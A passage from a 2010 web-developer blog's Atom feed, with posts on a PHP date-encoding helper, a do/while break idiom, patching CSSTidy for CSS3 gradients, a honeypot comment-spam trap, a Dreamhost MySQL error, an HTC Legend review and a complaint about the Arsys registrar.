(like&lt;code&gt;%A %d %B %Y Ã  %Hh%M&lt;/code&gt;), encoding it in utf8 again will also result in
wrong characters displayed.&lt;/p&gt;

&lt;p&gt;What I&amp;#39;ve done is creating a simple method in an helper that will take care of
encoding the result if needed.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function time($format, $date = null) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // On Windows, we will force the utf8 encoding of the date&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (DIRECTORY_SEPARATOR == &amp;#39;\\&amp;#39;) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return utf8_encode(strftime(utf8_decode($format), strtotime($date)));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // On linux, this is already taken care of by setlocale()&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  return strftime($format, strtotime($date));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This way, we make sure that the date is correctly displayed in utf8, no matter
the OS, even if you already supply utf8 characters in the format string.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Breaking out of an if statement in PHP</title>
   <link href="http://blog.pixelastic.com/2010/06/30/breaking-out-of-an-if-statement-in-php/"/>
   <updated>2010-06-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/30/breaking-out-of-an-if-statement-in-php</id>
   <content type="html">&lt;p&gt;One pattern I use when writing new method is to put conditions that may end
the script early on top. Like &amp;quot;stop the method if the arguments are not right&amp;quot;
or &amp;quot;stop the action if the user is not loggued in&amp;quot;.&lt;/p&gt;

&lt;p&gt;It allow me to avoid having nested &lt;code&gt;if&lt;/code&gt;/&lt;code&gt;else&lt;/code&gt;statement that became
unreadable.&lt;/p&gt;

&lt;p&gt;Felix from Debuggable wrote &lt;a href=&quot;http://debuggable.com/posts/programming-psychology-return-home-early%0A:4811de9f-ae28-49c2-a7dc-2f154834cda3&quot;&gt;something about that a while
ago.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is a pretty easy pattern to follow when writing methods, but can be quite
harder to achieve if you need to stick inside a main method. You just want to
go &amp;quot;out&amp;quot; of the &lt;code&gt;if&lt;/code&gt; statement, to continue the script, but not end the
method.&lt;/p&gt;

&lt;h2&gt;Break to the rescue&lt;/h2&gt;

&lt;p&gt;You can&amp;#39;t use the &lt;code&gt;break&lt;/code&gt;keyword in an &lt;code&gt;if&lt;/code&gt; statement like you would in a
loop. It just throws an error.&lt;/p&gt;

&lt;p&gt;But, you can define a simple &lt;code&gt;do {} while (false)&lt;/code&gt; loop and use the break
goodness inside it.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;do {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (empty($data)) break;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â  Â  Â Â Â  Â Â Â &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;create($data);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (!$this-&amp;gt;validates()) break;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â &lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;save();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;} while (false);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This helped me some times, hope it can help someone else.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>CSS3 gradients with CSSTidy</title>
   <link href="http://blog.pixelastic.com/2010/06/28/css3-gradients-with-csstidy/"/>
   <updated>2010-06-28T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/28/css3-gradients-with-csstidy</id>
   <content type="html">&lt;p&gt;Gradients are one of the new cool stuff CSS3 brought with it. Like the others
cool things, it still suffer from a partial implementation and vendor-specific
properties.&lt;/p&gt;

&lt;p&gt;It also isn&amp;#39;t correctly parsed by CSSTidy. Here I&amp;#39;ll show you how to patch
your CSSTidy to make it eat gradients correctly.&lt;/p&gt;

&lt;h2&gt;Quick and dirty patch&lt;/h2&gt;

&lt;p&gt;First, you&amp;#39;ll need to edit the huge &lt;code&gt;parse()&lt;/code&gt; method in c&lt;code&gt;sstidy.ph&lt;/code&gt;p. You&amp;#39;ll
have to add a condition to explictly tell CSSTidy not to discard &lt;code&gt;-webkit-
gradient&lt;/code&gt; and &lt;code&gt;-moz-linear-gradient&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Just open your &lt;code&gt;csstidy.php&lt;/code&gt; file, find the &lt;code&gt;parse()&lt;/code&gt; method and locate the
&lt;code&gt;case &amp;#39;instr&amp;#39;&lt;/code&gt; in the huge &lt;code&gt;switch&lt;/code&gt;statement.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if (!($this-&amp;gt;str_char === &amp;#39;)&amp;#39; &amp;amp;&amp;amp; in_array($string{$i}, $GLOBALS[&amp;#39;csstidy&amp;#39;][&amp;#39;whitespace&amp;#39;]) &amp;amp;&amp;amp; !$this-&amp;gt;str_in_str)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $this-&amp;gt;cur_string .= $temp_add;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;} **else {**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**  if ($this-&amp;gt;sub_value==&amp;quot;-webkit-gradient&amp;quot; || $this-&amp;gt;sub_value==&amp;quot;-moz-linear-gradient&amp;quot;) {**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**      $this-&amp;gt;cur_string.=&amp;#39; &amp;#39;;**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**  }**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**}**&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In bold, the &lt;code&gt;else&lt;/code&gt;part to add. This will make sure your webkit and firefox
gradient rules will get processed correctly.&lt;/p&gt;

&lt;p&gt;I don&amp;#39;t really understand WHY it work, but it does. The &lt;code&gt;parse()&lt;/code&gt;method is a
huge uncommented mess, it is quite difficult to understand it. There must be a
better way, a more generic one than specifying some properties, but I didn&amp;#39;t
manage to come with anything better than that.&lt;/p&gt;

&lt;p&gt;Fortunatly, the next part is cleaner.&lt;/p&gt;

&lt;h2&gt;Telling CSSTidy which properties not to merge&lt;/h2&gt;

&lt;p&gt;If you write a css like the following, only the latest (&lt;code&gt;color:white&lt;/code&gt;) rule
will get through CSSTidy.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;red&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That&amp;#39;s logical, because CSSTidy will remove any unused CSS declaration.
Unfortunatly, this is not what we want, because we need to declare several
&lt;code&gt;background:&lt;/code&gt; rules, one for Webkit, and one for Firefox.&lt;/p&gt;

&lt;p&gt;By looking at CSSTidy source code, we can find that it contain a quick fix to
allow the &lt;code&gt;cursor:&lt;/code&gt; property to be defined several time (to cope with the old
&lt;code&gt;cursor:pointer&lt;/code&gt; / &lt;code&gt;cursor:hand&lt;/code&gt; issue).&lt;/p&gt;

&lt;p&gt;I just extended this quick fix to work for other properties as well, and even
managed to allow them to be passed as a config value.&lt;/p&gt;

&lt;h2&gt;Defining the config value&lt;/h2&gt;

&lt;p&gt;First, open the &lt;code&gt;csstidy.php&lt;/code&gt; file, and around line 310 you should find a list
of default config values. Just add the following :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$this-&amp;gt;settings[&amp;#39;multiple_properties&amp;#39;] = array(&amp;#39;cursor&amp;#39;, &amp;#39;background&amp;#39;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will define the default list of properties that are allowed to be defined
several times in a css rule.&lt;/p&gt;

&lt;p&gt;Next, we&amp;#39;ll edit the &lt;code&gt;set_cfg()&lt;/code&gt; method to allow the passing of array values.
Just replace the else statement with this one :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;this-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;setting&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Merging&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array_merge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Setting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classic&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setting&lt;/span&gt;
  &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;setting&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_load_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can now pass a list of properties to be added to the existing list by
calling &lt;code&gt;-&amp;gt;set_cfg(&amp;#39;multiple_properties&amp;#39;, array(&amp;#39;property1&amp;#39;, &amp;#39;property2&amp;#39;));&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now, find the &lt;code&gt;css_add_property(&lt;/code&gt;) method, and around line 1066, change the&lt;code&gt;
if (strtolower($property) == &amp;#39;cursor&amp;#39;)&lt;/code&gt;if statement to this more generic one
:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if (in_array($property, $this-&amp;gt;get_cfg(&amp;#39;multiple_properties&amp;#39;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And now, in &lt;code&gt;csstidy_print.php&lt;/code&gt;, find the&lt;code&gt;_print()&lt;/code&gt; method, and replace the
&lt;code&gt;case PROPERTY&lt;/code&gt; block with this (more concise) one :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;case PROPERTY:&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Converting back multiple properties&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $multipleProperties = $this-&amp;gt;parser-&amp;gt;get_cfg(&amp;#39;multiple_properties&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  foreach($multipleProperties as $property) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $propertyLength = strlen($property);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if (substr($token[1], 0, $propertyLength)==$property) $token[1] = $property;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;


&lt;span class=&quot;x&quot;&gt;  // Applying correct casing&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $caseProperties = $this-&amp;gt;parser-&amp;gt;get_cfg(&amp;#39;case_properties&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if ($caseProperties==2) $token[1] = strtoupper($token[1]);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if ($caseProperties==1) $token[1] = strtolower($token[1]);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  $out .= $template[4] . $this-&amp;gt;_htmlsp($token[1], $plain) . &amp;#39;:&amp;#39; . $template[5];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;break;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;And that&amp;#39;s it&lt;/h2&gt;

&lt;p&gt;You now can have gradients compressed with CSSTidy. Well sort of, because this
is just a quick and dirty patch, as I&amp;#39;m not the creator of CSSTidy.&lt;/p&gt;

&lt;p&gt;This could surely be improved in a less hacky way, for example by compressing
the color code used in the gradients...&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Meeting with Eric Daspet and Stoyan Stefanov in Paris</title>
   <link href="http://blog.pixelastic.com/2010/06/25/meeting-with-eric-daspet-and-stoyan-stefanov-in-paris/"/>
   <updated>2010-06-25T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/25/meeting-with-eric-daspet-and-stoyan-stefanov-in-paris</id>
   <content type="html">&lt;p&gt;On July 21st will be held an &lt;a href=&quot;https://sites.google.com/a/survol.fr/webperf-user-%0Agroup/evenements/21-juillet-2010&quot;&gt;informal meeting in
Paris&lt;/a&gt; for all the web developers that have an
interest in web performance.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://performance.survol.fr/&quot;&gt;Eric Daspet&lt;/a&gt; and &lt;a href=&quot;http://www.phpied.com/&quot;&gt;Stoyan
Stefanov&lt;/a&gt; will be there and host a talk about
performance impact on sales and some more technical less known facts.&lt;/p&gt;

&lt;p&gt;The first part will be in French while Stoyan&amp;#39;s will be in English. If you
have the chance to be in Paris in July, do not miss this event.&lt;/p&gt;

&lt;p&gt;I will, of course, be there. Eric Daspet is the french &amp;quot;gourou&amp;quot; on web
performances, and Stoyan Stefanov is one of the main author of the Smushit
plugin/websit.&lt;/p&gt;

&lt;p&gt;Web performance is a really interesting subject where there is so much to
learn and so much to try.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Improved form spam protection</title>
   <link href="http://blog.pixelastic.com/2010/06/14/improved-form-spam-protection/"/>
   <updated>2010-06-14T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/14/improved-form-spam-protection</id>
   <content type="html">&lt;p&gt;My spam protection is really simple. Most spam bots will fill all input fields
they&amp;#39;ll find in a form. If one is named website or email, they will most
certainly want to fill them first.&lt;/p&gt;

&lt;p&gt;So I&amp;#39;ve added to every form a fake input field with a &lt;code&gt;name=&amp;quot;email&amp;quot;&lt;/code&gt;that have
to stay empty. I also labeled it &amp;quot;Spam bait&amp;quot; and displayed a little sentence
to tell my human readers to keep this field empty.&lt;/p&gt;

&lt;p&gt;I also hide the whole field using Javascript because most of the bots don&amp;#39;t
have Javascript enabled, but legitimate users do.&lt;/p&gt;

&lt;h2&gt;Does it work ?&lt;/h2&gt;

&lt;p&gt;To say the truth I don&amp;#39;t know. In the previous version of this website I
haven&amp;#39;t any kind of spam protection and was receinving almost a dozen spam
mails a day.&lt;/p&gt;

&lt;p&gt;Now that I&amp;#39;ve added this protection, I don&amp;#39;t receive spam anymore. But that
doesn&amp;#39;t mean my protection is working, it may just mean that the spam bots
needs a little time to adjust to the new website.&lt;/p&gt;

&lt;h2&gt;Improving the existing&lt;/h2&gt;

&lt;p&gt;One week ago, two spam comments managed to get past my protection. I have
currently no way to judge my protection efficiency. Maybe that was the only
two spam comments aimed at my website and I let them both slip in. Maybe I was
under a mass attack and managed to block thousand of spam and those two were
the only two to beat me.&lt;/p&gt;

&lt;p&gt;I don&amp;#39;t know, I have absolutly no numbers on that.&lt;/p&gt;

&lt;h2&gt;Getting some stats&lt;/h2&gt;

&lt;p&gt;So today, I decided to add some extra measures. I&amp;#39;m keeping count of every
spam I block (this number will be displayed below the comment list if at least
one spam was blocked).&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll also log some informations when someone is posting a comment : headers
sent, if javascript is enabled and the delay between displaying the form and
submitting it.&lt;/p&gt;

&lt;p&gt;It is useless to build protection if you don&amp;#39;t know what you want to be
protected against. So I&amp;#39;ll let the actual protection in place and will come
back to check the numbers in a couple of weeks.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll then know exactly how performs my existing spam protection and will be
able to extract spam patterns from the information I&amp;#39;ll gather.&lt;/p&gt;

&lt;p&gt;I think I&amp;#39;ll add a timing system, to block comments that were posted too fast.
If nothing works I&amp;#39;ll use Akismet, but I want to try to defeat them on my own
first.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>MySQL Error 1577 on Dreamhost</title>
   <link href="http://blog.pixelastic.com/2010/06/10/mysql-error-1577-on-dreamhost/"/>
   <updated>2010-06-10T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/10/mysql-error-1577-on-dreamhost</id>
   <content type="html">&lt;p&gt;Recently, when connecting to my MySQL databases on Dreamhost through Navicat,
I was greeted with a &amp;quot;&lt;code&gt;1577 - Cannot proceed because system tables used by
Event Scheduler were found damaged at server start&lt;/code&gt;&amp;quot; error message.&lt;/p&gt;

&lt;p&gt;It didn&amp;#39;t stop me from accessing the tables actually, so I didn&amp;#39;t bother. But
today it prevent me from copying tables from one server to another, so I
decided to have a deeper look into it.&lt;/p&gt;

&lt;p&gt;It seems that it has to do with a mysql upgrade issue. I contacted Dreamhost
about that and they told me that they just upgraded their servers to 5.1, and
that they needed to be restarted. Which they do for me.&lt;/p&gt;

&lt;p&gt;So if you ever run into the same problem, just contact Dreamhost support and
they&amp;#39;ll fix it for you.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>First impressions on my Android powered HTC Legend</title>
   <link href="http://blog.pixelastic.com/2010/06/10/first-impressions-on-my-android-powered-htc-legend/"/>
   <updated>2010-06-10T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/10/first-impressions-on-my-android-powered-htc-legend</id>
   <content type="html">&lt;p&gt;I recently bought an HTC Legend. My old phone was broken and I have plans to
develop an Android app. I&amp;#39;ve been using the phone for 3 weeks now, and I&amp;#39;m not
exactly as thrilled about it as I think I would.&lt;/p&gt;

&lt;h2&gt;Open source from Big Brother&lt;/h2&gt;

&lt;p&gt;I was hoping to have a little piece of open source software in my pocket. In
fact, it turns out that Google has a little more piece of me when I&amp;#39;m using
the phone.&lt;/p&gt;

&lt;p&gt;The software is not that open. Maybe it&amp;#39;s because of my phone carrier, SFR,
but there are a lot of pre-installed and useless apps that I can&amp;#39;t get rid of.&lt;/p&gt;

&lt;p&gt;Some settings can&amp;#39;t even be changed because I&amp;#39;m only a user of my own phone
and don&amp;#39;t have a root access by default. The &amp;quot;Accessibility&amp;quot; setting panel is
a joke (I&amp;#39;ll post a picture of it later)&lt;/p&gt;

&lt;p&gt;When I first switched the phone on, I was asked for my Google credentials.
Once entered, all my Google life was downloaded to the phone : mail address
book, google maps location and google calendar meetings. Asking first if I
wanted that would have been great.&lt;/p&gt;

&lt;p&gt;Because loading 500+ mails address book into a phone memory is not the kind of
&amp;quot;smart&amp;quot; I was expecting from a smart phone. I had to manually remove all the
contacts I needed not from my phone.&lt;/p&gt;

&lt;p&gt;And then the phone was complaining again, when it tried to synchronize back
with Gmail, when it tried to remove the mails from my online address book.&lt;/p&gt;

&lt;p&gt;I didn&amp;#39;t want them downloaded in the first place and once I removed them I
didn&amp;#39;t want them to be deleted from my online address book !&lt;/p&gt;

&lt;h2&gt;Disabling sync&lt;/h2&gt;

&lt;p&gt;So I tried to remove the google account from my phone, but that is clearly
impossible and is NEEDED to make the phone work. What ? This is stupid.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m not confortable with having a device from which I can&amp;#39;t even remove my
credentials... At least I disabled the auto-sync feeature.&lt;/p&gt;

&lt;p&gt;An other thing to note is that if you want to fine-tune what kind of data your
phone syncs, you first have to enable the auto-sync feature and quickly
disable the data you don&amp;#39;t want, because they all are checked by default.&lt;/p&gt;

&lt;h2&gt;Other settings&lt;/h2&gt;

&lt;p&gt;Even changing the default ringtone is a chore. There&amp;#39;s no way to easily select
a music file saved on the SD card. There isn&amp;#39;t even a native file explorer,
you have to download one from the Market.&lt;/p&gt;

&lt;p&gt;The camera quality isn&amp;#39;t very good and the auto-focus makes pictures more
blurry with it than without. Even my old Nokia XpressMusic was taking better
shots.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I really am disapointed by this phone actually, and by the Android platform as
a whole. Maybe the underlying app is great but as an end-user we are blocked
from it.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll try to root my device and remove the SFR rom to get what I want and need.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Arsys, a registrar to avoid</title>
   <link href="http://blog.pixelastic.com/2010/06/06/arsys-a-registrar-to-avoid/"/>
   <updated>2010-06-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2010/06/06/arsys-a-registrar-to-avoid</id>
   <content type="html">&lt;p&gt;When I use great registrars or hosting services, I say so, and loudly. From
all those that I have tested, there is no better registrar than Gandi and no
better hosting service than Dreamhost.&lt;/p&gt;

&lt;p&gt;But when I encounter really lousy services, I won&amp;#39;t hide to say so too.&lt;/p&gt;

&lt;p&gt;Arsys is one of them. It&amp;#39;s a franco-german-spanish registrar. I just needed to
change the DNS server of a domain on it, and even that was impossible.&lt;/p&gt;

&lt;p&gt;When I tried to put Dreamhost NS servers in the form and submit it, I was
greeted with a bold red error message telling me that an error occured and
asking me to try again later.&lt;/p&gt;

&lt;p&gt;I did try again later, just to receive the exact same error message.&lt;/p&gt;

&lt;p&gt;I wouldn&amp;#39;t have to leave Arsys default NS servers if at least they allowed me
to configure A, CNAME and MX records as I wanted but unfortunatly, none of
this is available.&lt;/p&gt;

&lt;p&gt;I tried to contact their support service, to tell them my problem, but here
again I was faced with an error message on a blank page (in spanish this time)
telling me that the server encountered a problem and that I needed to contact
an administrator (sic)&lt;/p&gt;

&lt;p&gt;So I tried to find a contact page on their public site, and after some 404
errors finally found an email address.&lt;/p&gt;

&lt;p&gt;I send them a email telling them about my problems. They answer stating that
if I have any problem, I should use their contact form to contact
hostmaster@arsys.fr. I tried, and this time it worked.&lt;/p&gt;

